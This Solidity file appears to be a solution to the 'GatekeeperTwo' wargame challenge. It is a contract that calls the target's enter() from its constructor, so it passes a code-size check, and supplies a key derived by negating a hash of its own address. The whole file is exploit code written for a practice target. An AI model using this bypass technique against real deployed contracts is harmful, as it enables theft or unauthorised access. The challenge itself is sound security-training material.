// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoSol {
    constructor(IGatekeeperTwo _two) public {
        attack(_two);
    }

    function attack(IGatekeeperTwo _two) internal {
        bytes8 _gateKey = bytes8(~(uint64(bytes8(keccak256(abi.encodePacked(address(this)))))));
        _two.enter(_gateKey);
    }
}
